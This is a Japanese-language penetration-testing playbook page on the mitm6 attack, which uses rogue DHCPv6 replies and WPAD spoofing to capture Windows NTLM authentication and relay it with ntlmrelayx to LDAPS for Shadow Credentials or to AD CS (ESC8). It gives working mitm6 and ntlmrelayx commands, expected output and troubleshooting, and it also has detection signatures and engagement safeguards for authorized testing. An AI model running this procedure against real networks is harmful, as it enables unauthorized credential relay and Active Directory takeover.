# mitm6 — IPv6 DNS スプーフィング（DHCPv6 / WPAD 悪用）

> **[HIGH IMPACT]** 本攻撃は以下の理由で本番では原則禁止または個別合意必須：
> - [x] 業務停止リスク（セグメント全体の DHCPv6 に干渉し、意図しないホストの IPv6 DNS 設定が攻撃者端末を向く。業務通信の一部が攻撃者を経由する可能性がある）
> - [ ] 持続化に該当
> - [ ] 不可逆な設定変更を含む（DHCPv6 リース期間中は影響が持続するが、停止後は自然に解消される）
> - [x] SIEM/EDR で確実に検知される（ネットワーク NDR による不正 DHCPv6 サーバー検出 / MDI「Suspected network tampering」）
>
> 実施可否は事前合意で明示確認すること。**対象セグメントと実施時間帯を書面で限定すること。業務時間内の実施は原則禁止。**
> 演習環境では制約なし。

---

## 着火条件

以下のすべてが揃ったときに試みる：

- LLMNR / NBT-NS が GPO で無効化されており、Responder でハッシュが来ない
- Coerce 系（PetitPotam / PrinterBug / DFSCoerce）も塞がれているまたは使えない状況
- 対象セグメントで IPv6 が無効化されていない（または未確認）
- ntlmrelayx を構えられる LDAPS / SMB / AD CS リレー先が存在する

**攻撃者の思考トレース：** LLMNR / NBT-NS が GPO で無効化された環境でも、IPv6 の DHCPv6 は GPO による制御が及ばないことが多い。Windows は IPv6 を IPv4 より優先する仕様のため、偽の DHCPv6 サーバーが DNS を提供すると、WPAD 等の名前解決が攻撃者端末を向く。GPO による LLMNR 無効化を回避できる数少ない手法の一つ。

---

## 原理

- **IPv6 優先仕様**：Windows はデュアルスタック環境で IPv6 アドレスを IPv4 より優先して通信を試みる（RFC 6724 に基づく）
- **DHCPv6 Solicit の悪用**：Windows は起動時・ネットワーク接続時に DHCPv6 Solicit をリンクローカルマルチキャスト（`ff02::1:2`）で送信する。mitm6 はこれに偽 Advertise / Reply で応答し、テスター端末を IPv6 DNS サーバーとして設定させる
- **WPAD 問い合わせの横取り**：WPAD（Web Proxy Auto-Discovery）が有効な場合、クライアントは DNS で `wpad.[DOMAIN]` を解決しようとする。mitm6 がこれにテスター端末の IP を返すと、クライアントは攻撃者を HTTP プロキシとして設定する
- **ntlmrelayx との連携**：WPAD プロキシに接続したクライアントが NTLM 認証を送ってくる。ntlmrelayx がこれを LDAPS / SMB / AD CS へリレーする
- **DHCPv6 のリンクローカル制約**：DHCPv6 Solicit はリンクローカルマルチキャストのため、ルーターを越えない。テスター端末が対象セグメントの L2 に到達できていることが必須

---

## 環境前提

- **実行環境**: テスター端末（ターゲットと同一 L2 セグメント。DHCPv6 はリンクローカルマルチキャストのためルーター越え不可）
- **必要なツール**:
  - mitm6（`pip install mitm6 --break-system-packages`）: 別途インストール要。ペネトレ用 Linux ディストリに含まれる場合もあるが最新版の確認推奨（GitHub: `dirkjanm/mitm6`）
  - ntlmrelayx（Impacket 付属・ペネトレ用 Linux ディストリ標準搭載）
- **必要な権限**: テスター端末上での `root` 権限（DHCPv6 パケット送信・raw socket 操作のため必須）
- **オフライン代替**: インターネット遮断環境では mitm6 を事前に whl ファイルとして転送しておく（`pip install mitm6-[VERSION]-py3-none-any.whl --break-system-packages`）

---

## 観点・着眼点

### 先に確認すること：IPv6 の有効性と WPAD 設定

```bash
# [Attacker] 対象セグメントで DHCPv6 Solicit が飛んでいるかを観察（受動確認）
sudo tcpdump -i [INTERFACE] 'udp port 547' -n
# → DHCPv6 Solicit（宛先 ff02::1:2、送信元がクライアントのリンクローカル）が見えれば IPv6 が有効
# [INTERFACE]: テスター端末の対象セグメント向けインターフェース（ip a で確認）
```

```bash
# [Attacker] WPAD 自動検出が有効かどうかの間接確認（DNS を引いてみる）
nslookup wpad.[DOMAIN] [DC_IP]
# → "Non-existent domain" が返れば WPAD DNS エントリなし（mitm6 で偽応答できる余地がある）
# → 実際のエントリが返れば WPAD サーバーが存在する（mitm6 より先に本物が応答する可能性）
```

### 何が出たら次に何をするか

| シグナル | 判断・次のアクション |
|---------|------------------|
| mitm6 が `Sent REPLY for [CLIENT_IPv6]` を出力 | DHCPv6 偽応答が刺さっている。ntlmrelayx 側に認証が来るまで待つ |
| ntlmrelayx に `Incoming connection` が表示される | WPAD 経由で NTLM 認証が来た。リレー先の操作（LDAPS / ESC8 等）が進む |
| mitm6 が何も出力しない（Sent REPLY がない） | 対象ホストが IPv6 無効化されているか、同一 L2 に到達できていない |
| mitm6 は動いているが ntlmrelayx に何も来ない | WPAD 自動検出が GPO で無効化されている可能性。または実際の WPAD DNS エントリが先に解決されている |
| ntlmrelayx で LDAPS の Channel Binding エラー | LDAP Channel Binding が有効。`-t smb://[TARGET_IP]` または `-t http://[CA_SERVER]/certsrv/certfnsh.asp`（ESC8）に切り替える |

---

## 手順

### 起動順序（重要）：ntlmrelayx → mitm6 の順で起動する

ntlmrelayx がリスナーを先に立てることで、mitm6 が誘導した認証コールバックを確実に受け取れる。
**ntlmrelayx を先に起動し、その後 mitm6 を起動する。**

---

### Step 1: ntlmrelayx を先に起動（LDAPS Shadow Credentials 目的の例）

```bash
# [Attacker] ターミナル 1: ntlmrelayx を WPAD + LDAPS リレー設定で起動
# --wpad: WPAD プロキシの NTLM 認証を処理する
# --shadow-credentials: 認証が来たマシンアカウントに Shadow Credentials を追加
# --shadow-target: WPAD 経由で認証が来ることを期待するターゲットマシンアカウント
sudo ntlmrelayx.py \
  -t ldaps://[DC_IP] \
  --wpad \
  --shadow-credentials \
  --shadow-target [TARGET_MACHINE$]
```

AD CS ESC8 をターゲットにする場合：

```bash
# [Attacker] ESC8 リレー用 ntlmrelayx 起動
sudo ntlmrelayx.py \
  -t http://[CA_SERVER]/certsrv/certfnsh.asp \
  --wpad \
  --adcs \
  --template [CERT_TEMPLATE]
```

ntlmrelayx の各オプション詳細 → `ntlmrelayx.md`

---

### Step 2: mitm6 を起動

事前準備（必須）：`[INTERFACE]` はターゲットセグメントに接続しているインターフェースを `ip a` で確認して指定する。`-d [DOMAIN]` は対象の AD ドメイン名（例: `-d example.local`）を必ず指定する。**ドメインを指定しないと対象外ドメインの DNS クエリにも偽応答してしまい、影響範囲が意図せず拡大する。**

```bash
# [Attacker] ターミナル 2: mitm6 を対象ドメインに限定して起動
sudo mitm6 -i [INTERFACE] -d [DOMAIN]
```

主要オプション：

| オプション | 効果 |
|-----------|------|
| `-i [INTERFACE]` | DHCPv6 を送信するインターフェース |
| `-d [DOMAIN]` | 対象ドメインのみに DNS 偽応答（必須：影響範囲を限定する） |
| `--no-ra` | Router Advertisement を送信しない（RA なしでも DHCPv6 は動作する） |
| `-v` | 詳細ログ（DHCPv6 Solicit / Reply の詳細を表示） |

---

### Step 3: 認証フローの待機と確認

mitm6 が DHCPv6 偽応答を送り始めると、対象ホストがテスター端末を IPv6 DNS として使い始める。
`wpad.[DOMAIN]` の DNS 問い合わせが来ると ntlmrelayx の WPAD サーバーへ誘導され、NTLM 認証が発生する。

```
# mitm6 出力例（DHCPv6 偽応答成功時）
[*] Sent REPLY for [CLIENT_IPv4] with [ATTACKER_IPv6] as DNS

# ntlmrelayx 出力例（WPAD 経由で NTLM 認証受信時）
[*] Incoming connection ([CLIENT_IP], [NTLM_TARGET]) NTLMSSP_NEGOTIATE
[*] SMBD-Thread-X: Relaying to ldaps://[DC_IP]
[*] Shadow credentials attack required LDAPS
[*] Generating RSA keypair
```

> ntlmrelayx が出力する PFX ファイルパスとパスワードを記録しておく。
> その後の PKINIT → TGT 取得フローは `ntlmrelayx.md`（Step 3）を参照。

---

## 刺さらなかったとき

| 状況 | 対処 |
|------|------|
| mitm6 が何も出力しない（Sent REPLY がない） | 対象セグメントの IPv6 が GPO・NIC 設定・DHCP スコープで無効化されている。IPv6 が無効な環境では mitm6 は機能しない |
| DNS 問い合わせは来るが ntlmrelayx に NTLM が届かない | WPAD 自動検出が GPO で無効化されているか、実際の WPAD DNS エントリが先に応答している。`-d` の指定ドメインが正しいか確認する |
| ntlmrelayx でリレーは成功するが権限が低い | WPAD 経由で一般ユーザーの認証のみが届いている。管理者アカウントのログインまたは DC$ の認証が来るまで継続する |
| LDAPS Channel Binding エラー | LDAP Channel Binding が有効。`-t smb://[TARGET_IP]` または ESC8（`-t http://[CA_SERVER]/certsrv/certfnsh.asp`）に切り替える |
| IPv6 が全ホストで無効（セグメント全体） | mitm6 は機能しない。Coerce 系（PetitPotam / PrinterBug / DFSCoerce）に切り替える → `Coerce.md` |

---

## 注意点・落とし穴

- **mitm6 は影響範囲が非常に広い**：セグメント全体の DHCPv6 に干渉するため、スコープ外のホストにも影響が及ぶ可能性がある。本番では対象セグメントと時間帯を書面で限定し、業務時間内は原則使用しない
- **停止後も DHCPv6 リースが残る**：mitm6 を停止しても、クライアントが取得した IPv6 リースの期間中は攻撃者端末を DNS サーバーとして参照し続ける。停止後は対象ホストの再起動またはリース期間の経過を待つ
- **`-d` で対象ドメインを必ず限定する**：指定しないとセグメント全体の DNS クエリに応答してしまい、業務影響が大幅に拡大する
- **WPAD が GPO で無効化されている環境では効果が大幅に低下する**：mitm6 は WPAD 経由の NTLM 認証引き込みが主な手法。WPAD が無効なら DNS 偽応答だけでは NTLM 認証が来にくい
- **ntlmrelayx と mitm6 は別ターミナルで起動する**：同一プロセスで動かすことはできない。ntlmrelayx を先に起動してから mitm6 を起動する順序を守る
- **LLMNR / NBT-NS との併用は不要**：mitm6 は独立して動作する。Responder は起動しなくてよい（NTLM 認証は WPAD 経由で ntlmrelayx が受け取る）

---

## 検知される挙動

| 観点 | 検知シグネチャ |
|------|-------------|
| ネットワーク NDR | DHCPv6 Advertise / Reply が正規の DHCP サーバー以外の IP から送信されている（不正な DHCPv6 サーバー検出） |
| Microsoft Defender for Identity (MDI) | 「Suspected network tampering」/ 「Network device reconnaissance using DNS」アラート |
| DHCP サーバーログ / IDS 相関ルール | 不正な DHCPv6 応答がクライアントに到達しているログ |
| Windows イベントログ（クライアント側） | クライアントの IPv6 アドレスが突然変わる / 新しい DNS サーバーが設定される変更ログ |
| Sysmon（クライアント側） | Event ID 22（DNS クエリ）— `wpad.[DOMAIN]` への問い合わせが攻撃者端末へ向いている |

---

## 本番での前提

- **事前合意の要否**: ★★★（書面承認必須）。セグメント全体の DHCPv6 に干渉するため、スコープ外ホストへの波及リスクがある。実施可否・対象セグメント・実施時間帯を書面で明示確認する
- **想定されるSIEM/EDR検知**: ネットワーク NDR（不正 DHCPv6）/ MDI「Suspected network tampering」/ クライアントのネットワーク設定変更ログ / Sysmon Event 22
- **業務影響リスク**: DHCPv6 リース期間中は対象ホストのデフォルト DNS が攻撃者端末を向く。業務用 WPAD が機能しなくなる / HTTP トラフィックが攻撃者を経由する可能性がある。**業務時間外に実施・時間帯を限定することが必須**
- **原状回復必須項目**:
  - ✅ mitm6 停止後、影響を受けたホストの IPv6 リース解放を確認（再起動またはリース期間経過待ち）
  - ✅ ntlmrelayx 側で取得した Shadow Credentials / RBCD / マシンアカウントの削除（`ntlmrelayx.md` 参照）
  - ✅ 取得した認証情報・証明書・ハッシュの暗号化保管 → テスト完了時破棄
- **取得情報の取扱**: 認証情報・証明書は暗号化保管、テスト完了後破棄
- **演習環境での扱い**: 制約なし（HTB / OSCP 等は本セクション全項目をスキップしてよい）

---

## 関連技術

- 前：LLMNR / NBT-NS ポイズニングが GPO で無効化されている状況の確認 → `./Responder.md`
- 前：Coerce 系が全滅した場合の代替経路として使用 → `./Coerce.md`
- 後：受け取った NTLM 認証のリレー → `./ntlmrelayx.md`
- 後：LDAPS Shadow Credentials 取得 → `./ntlmrelayx.md`（Step 3）
- 後：ESC8 AD CS リレー → `./ntlmrelayx.md`（Step 5）
